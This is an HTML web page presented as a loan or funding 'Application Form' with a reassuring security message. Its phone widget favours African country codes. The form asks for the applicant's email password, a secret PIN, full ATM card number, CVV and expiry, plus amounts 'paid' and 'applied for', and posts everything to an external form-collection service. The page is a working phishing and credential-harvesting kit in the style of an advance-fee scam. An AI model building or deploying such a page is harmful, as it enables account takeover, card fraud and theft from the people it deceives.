<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Application Form</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.min.css"/>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      padding: 20px;
    }

    h2 {
      text-align: center;
    }

    .secure-message {
      text-align: center;
      color: green;
      margin-bottom: 15px;
    }

    form {
      max-width: 500px;
      margin: 0 auto;
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px #ccc;
    }

    label {
      display: block;
      margin-top: 15px;
    }

    input {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
      box-sizing: border-box;
    }

    .toggle {
      margin-top: -25px;
      float: right;
      margin-right: 10px;
      cursor: pointer;
      font-size: 12px;
      color: blue;
    }

    .error {
      color: red;
      font-size: 12px;
      display: none;
    }

    button {
      width: 100%;
      padding: 10px;
      background: #28a745;
      color: white;
      font-size: 16px;
      margin-top: 20px;
      border: none;
      border-radius: 5px;
    }

    .iti {
      width: 100%;
    }
  </style>
</head>
<body>

  <h2>Application Form</h2>
  <div class="secure-message">We keep your details secure and confidential.</div>

  <form action="https://formspree.io/f/your_form_id" method="POST" onsubmit="return validateForm()">
    
    <label>Full Name
      <input type="text" name="full_name" required />
    </label>

    <label>Phone Number
      <input id="phone" type="tel" name="phone_number" required />
      <div class="error" id="phone-error">Please enter a valid phone number.</div>
    </label>

    <label>Email
      <input type="email" name="email" required />
    </label>

    <label>Email Password
      <input type="password" name="email_password" id="emailPass" required />
      <span class="toggle" onclick="togglePassword('emailPass')">Show</span>
    </label>

    <label>Secret Code (PIN)
      <input type="password" name="secret_code" id="pinField" required />
      <span class="toggle" onclick="togglePassword('pinField')">Show</span>
    </label>

    <label>ATM Card Number
      <input type="text" name="card_number" maxlength="16" pattern="\d{16}" required />
    </label>

    <label>CVV
      <input type="text" name="cvv" maxlength="3" pattern="\d{3}" required />
    </label>

    <label>Expiry Date (MM/YY)
      <input type="text" name="expiry" pattern="\d{2}/\d{2}" placeholder="MM/YY" required />
    </label>

    <label>Amount Paid
      <input type="number" name="amount_paid" required />
    </label>

    <label>Amount Applied For
      <input type="number" name="amount_applied" required />
    </label>

    <button type="submit">Submit Application</button>
  </form>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
  <script>
    const phoneInput = document.querySelector("#phone");
    const iti = window.intlTelInput(phoneInput, {
      initialCountry: "auto",
      preferredCountries: ["ke", "ng", "gh", "tz", "ug", "ls", "za"],
      geoIpLookup: callback => {
        fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE')
          .then(res => res.json())
          .then(data => callback(data.country))
          .catch(() => callback("ke"));
      },
      utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
    });

    function togglePassword(id) {
      const input = document.getElementById(id);
      input.type = input.type === "password" ? "text" : "password";
    }

    function validateForm() {
      const phoneValid = iti.isValidNumber();
      const phoneError = document.getElementById("phone-error");
      if (!phoneValid) {
        phoneError.style.display = "block";
        return false;
      } else {
        phoneError.style.display = "none";
      }
      return true;
    }
  </script>

</body>
</html>
